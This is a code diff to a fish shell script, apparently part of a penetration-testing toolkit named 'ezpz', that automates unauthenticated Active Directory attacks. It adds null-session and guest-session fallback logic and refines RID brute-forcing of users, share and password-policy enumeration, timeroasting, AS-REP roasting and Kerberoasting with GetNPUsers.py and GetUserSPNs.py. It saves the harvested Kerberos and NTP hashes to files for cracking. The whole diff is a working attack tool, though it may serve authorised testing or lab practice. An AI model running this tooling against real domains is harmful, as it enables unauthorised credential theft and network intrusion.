@@ -1,3 +1,23 @@
+# Return success if a null/guest session can read something useful.
+function __ezpz_enumnull_has_data --argument-names target user pass
+    set -l shares (timeout 30 nxc smb $target -u "$user" -p "$pass" --shares --smb-timeout 25 2>/dev/null)
+    if string match -qr '(READ|WRITE|NO ACCESS)' -- $shares
+        return 0
+    end
+
+    set -l users (timeout 30 nxc smb $target -u "$user" -p "$pass" --rid-brute 100 2>/dev/null)
+    if string match -qr 'SidTypeUser' -- $users
+        return 0
+    end
+
+    set -l groups (timeout 30 nxc ldap $target -u "$user" -p "$pass" --groups 2>/dev/null)
+    if string match -qr 'membercount|Administrators|Domain Admins' -- $groups
+        return 0
+    end
+
+    return 1
+end
+
 function _ezpz_enumnull
     source $EZPZ_HOME/functions/_ezpz_colors.fish
 
@@ -46,7 +66,8 @@ Examples:
 
     set target $_flag_target
     
-    # Set credentials based on --guest flag
+    # Set credentials based on --guest flag. Without the flag, start with a
+    # null session and only fall back to guest when null returns nothing.
     if set -q _flag_guest
         set auth_user "guest"
         set auth_pass ""
@@ -55,6 +76,16 @@ Examples:
         set auth_user ""
         set auth_pass ""
         set auth_desc "null session"
+
+        if not __ezpz_enumnull_has_data $target "" ""
+            ezpz_warn "Null session returned no data. Trying guest account..."
+            if __ezpz_enumnull_has_data $target "guest" ""
+                set auth_user "guest"
+                set auth_desc "guest account (null session returned nothing)"
+            else
+                ezpz_warn "Guest account also returned no data (disabled or access denied)."
+            end
+        end
     end
 
     # Extract DC FQDN from /etc/hosts if needed for Kerberos
@@ -86,7 +117,7 @@ Examples:
     ezpz_title "Starting enumeration on $target using $auth_desc..."
 
     # Extract domain first (fast)
-    set domain (timeout 60 nxc smb $target 2>/dev/null | grep 'domain:' | head -1 | sed -n 's/.*domain:\([^)]*\).*/\1/p')
+    set domain (timeout 60 nxc smb $target 2>/dev/null | grep -a 'domain:' | head -1 | sed -n 's/.*domain:\([^)]*\).*/\1/p')
     if test $status -eq 124
         ezpz_warn "Operation timed out. Skipping."
     end
@@ -111,7 +142,7 @@ Examples:
     # User Enumeration - prioritize --rid-brute over --users
     ezpz_header "Enumerating users with RID Bruteforcing"
     ezpz_cmd "nxc smb $nxc_args --rid-brute 10000"
-    nxc smb $nxc_args --rid-brute 10000 2>/dev/null | grep 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
+    nxc smb $nxc_args --rid-brute 10000 2>/dev/null | grep -a 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
     
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping."
@@ -124,7 +155,7 @@ Examples:
         # Fallback to --users
         ezpz_header "Enumerating users (fallback)"
         ezpz_cmd "nxc smb $nxc_args --users"
-        nxc smb $nxc_args --users 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
+        nxc smb $nxc_args --users 2>/dev/null | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
         
         if test $pipestatus[1] -eq 124
             ezpz_warn "Operation timed out. Skipping."
@@ -141,26 +172,52 @@ Examples:
     # Groups
     ezpz_header "Enumerating groups"
     ezpz_cmd "nxc ldap $nxc_args --groups"
-    timeout 60 nxc ldap $nxc_args --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"
-    if test $pipestatus[1] -eq 124
+    set groups_out (timeout 60 nxc ldap $nxc_args --groups 2>/dev/null)
+    set groups_status $status
+    if test $groups_status -eq 124
         ezpz_warn "Operation timed out. Skipping."
+    else
+        set -l groups_rendered
+        if string match -q '*membercount*' -- $groups_out
+            # Older nxc output format
+            set groups_rendered (printf '%s\n' $groups_out | grep -a 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -av 'membercount: 0' | sed "s/membercount:/-/g")
+        else
+            # nxc >= 1.5 renders an aligned Group/Members/Description table
+            set groups_rendered (printf '%s\n' $groups_out | grep -avF -e '[*]' -e '[+]' -e '[-]' -e '[!]' | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//')
+        end
+
+        set -l groups_data (printf '%s\n' $groups_rendered | grep -avE '^-Group-[[:space:]]')
+        if test -n "$groups_data"
+            printf '%s\n' $groups_rendered
+        else
+            ezpz_warn "No groups returned (access denied?)."
+        end
     end
 
     # Password Policy
     ezpz_header "Enumerating password policy"
     ezpz_cmd "nxc smb $nxc_args --pass-pol"
-    timeout 60 nxc smb $nxc_args --pass-pol 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5-
-    if test $pipestatus[1] -eq 124
+    set passpol_out (timeout 60 nxc smb $nxc_args --pass-pol 2>/dev/null)
+    set passpol_status $status
+    if test $passpol_status -eq 124
         ezpz_warn "Operation timed out. Skipping."
+    else
+        set -l passpol_rendered (printf '%s\n' $passpol_out | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-)
+        if test -n "$passpol_rendered"
+            printf '%s\n' $passpol_rendered
+        else
+            ezpz_warn "No password policy returned (access denied?)."
+        end
     end
 
     # Shares Enumeration
     ezpz_header "Enumerating shares"
     ezpz_cmd "nxc smb $nxc_args --shares --smb-timeout 999"
     set shares_output (mktemp)
-    timeout 60 nxc smb $nxc_args --shares --smb-timeout 999 2>/dev/null | grep -E "READ|WRITE" | tr -s " " | cut -d " " -f 5- > $shares_output
+    timeout 60 nxc smb $nxc_args --shares --smb-timeout 999 2>/dev/null | grep -aE "READ|WRITE|NO ACCESS" | tr -s " " | cut -d " " -f 5- > $shares_output
+    set shares_status $pipestatus[1]
     
-    if test $pipestatus[1] -eq 124
+    if test $shares_status -eq 124
         ezpz_warn "Operation timed out. Skipping."
     else if test -s $shares_output
         # Format shares as table using READ/WRITE as delimiter
@@ -181,11 +238,17 @@ Examples:
                 share = substr(line, 1, RSTART-1)
                 perm = "WRITE"
                 desc = substr(line, RSTART+6)
+            } else if (match(line, /NO ACCESS/)) {
+                share = substr(line, 1, RSTART-1)
+                perm = "NO ACCESS"
+                desc = substr(line, RSTART+9)
             }
             gsub(/^[ \t]+|[ \t]+$/, "", share)
             gsub(/^[ \t]+|[ \t]+$/, "", desc)
             printf "%-20s %-15s %s\n", share, perm, desc
         }'
+    else
+        ezpz_warn "No shares returned (access denied?)."
     end
     
     # Cleanup temp file
@@ -200,9 +263,11 @@ Examples:
         set time_file "$domain"_time.hash
     end
     ezpz_cmd "nxc smb $_flag_target -M timeroast"
-    nxc smb $_flag_target -M timeroast 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
+    nxc smb $_flag_target -M timeroast 2>/dev/null | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
     if test -s $time_file
         ezpz_info "Saving hashes to $time_file"
+    else
+        rm -f $time_file
     end
 
     # Test for exploitable accounts if user files exist
@@ -228,14 +293,14 @@ Examples:
         end
 
         # Build GetNPUsers command for null session
-        set getnpusers_cmd GetNPUsers.py "$domain/" -usersfile "$active_users_file" -dc-ip "$_flag_target"
+        set getnpusers_cmd GetNPUsers.py "$domain/" -usersfile "$active_users_file" -dc-ip "$_flag_target" -no-pass -request
         if set -q _flag_kerb -a -n "$dc_fqdn"
             set -a getnpusers_cmd -k -dc-host "$dc_fqdn"
         end
         
         ezpz_cmd "$getnpusers_cmd"
         set output ($getnpusers_cmd 2>&1)
-        set hash_lines (string split '\n' $output | grep '^\$krb5asrep\$')
+        set hash_lines (printf '%s\n' $output | grep -a '^\$krb5asrep\$')
         
         # Show and save hash lines if found
         if test -n "$hash_lines"
@@ -246,7 +311,7 @@ Examples:
             ezpz_info "Saving hashes to $asrep_file"
             
             # Extract first AS-REP roastable user for Kerberoasting
-            set asrep_user (echo $hash_lines[1] | grep -oE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f4)
+            set asrep_user (printf '%s\n' $hash_lines[1] | grep -aoE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f4)
             if test -n "$asrep_user"
                 ezpz_header "Searching for Kerberoastable accounts using AS-REP user"
                 set kerb_file "$target"_kerb.hash
@@ -254,23 +319,19 @@ Examples:
                     set kerb_file "$domain"_kerb.hash
                 end
                 
-                set getuserspns_cmd GetUserSPNs.py "$domain/" -no-preauth "$asrep_user" -usersfile "$active_users_file" -dc-ip "$_flag_target"
+                set getuserspns_cmd GetUserSPNs.py "$domain/" -no-preauth "$asrep_user" -usersfile "$active_users_file" -dc-ip "$_flag_target" -no-pass -request
                 if set -q _flag_kerb -a -n "$dc_fqdn"
                     set -a getuserspns_cmd -k -dc-host "$dc_fqdn"
                 end
                 
                 ezpz_cmd "$getuserspns_cmd"
                 set spn_output ($getuserspns_cmd 2>&1)
-                set spn_hash_lines (string split '\n' $spn_output | grep '^\$krb5tgs\$')
+                set spn_hash_lines (printf '%s\n' $spn_output | grep -a '^\$krb5tgs\$')
                 
                 # Show and save hash lines if found
                 if test -n "$spn_hash_lines"
                     # Convert hashes to user:hash format
-                    set kerb_formatted (mktemp)
-                    for hash in $spn_hash_lines
-                        echo $hash | sed -E 's/\$krb5tgs\$23\$\*([^$]+)\$.*$/\1:&/'
-                    end
-                    printf '%s\n' $spn_hash_lines | sed -E 's/\$krb5tgs\$23\$\*([^$]+)\$.*$/\1:&/' > $kerb_file
+                    printf '%s\n' $spn_hash_lines | sed -E 's/\$krb5tgs\$23\$\*([^$]+)\$.*$/\1:&/' | tee $kerb_file
                     ezpz_info "Saving hashes to $kerb_file"
                 end
             end
@@ -292,7 +353,7 @@ Examples:
                 end
                 
                 ezpz_cmd "$pre2k_cmd"
-                $pre2k_cmd 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
+                $pre2k_cmd 2>/dev/null | grep -aioE "VALID CREDENTIALS: .*" --color=never
             else
                 ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
             end
